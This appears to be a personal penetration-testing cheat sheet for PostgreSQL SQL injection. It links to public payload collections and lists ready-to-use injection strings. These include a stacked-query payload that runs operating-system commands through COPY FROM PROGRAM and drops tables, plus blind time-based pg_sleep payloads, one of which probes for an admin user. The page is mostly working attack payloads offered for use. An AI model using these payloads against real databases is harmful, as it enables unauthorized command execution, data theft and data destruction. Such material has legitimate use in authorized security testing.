# PostgreSQLi

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md" %}

{% embed url="https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet" %}

1. Test username or password fields with a single quote(').
2. Use time-based payloads to identify the DB.
3. Once the db is known, look for specific vulnerabilities to gain further access.
4. For MSSQL, enable xp\_cmdshell including advanced options.

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution

# If web-based
';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';SELECT * FROM cmd_exec;DROP TABLE IF EXISTS cmd_exec;--
```
{% endcode %}

## Blind

{% code overflow="wrap" fullWidth="true" %}
```sql
'||pg_sleep(10)-- -
; select pg_sleep(10);#
; select pg_sleep(10)#
; select pg_sleep(10) -- -
# in case table users and username admin is true
'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) from users where username='admin')-- - 
```
{% endcode %}
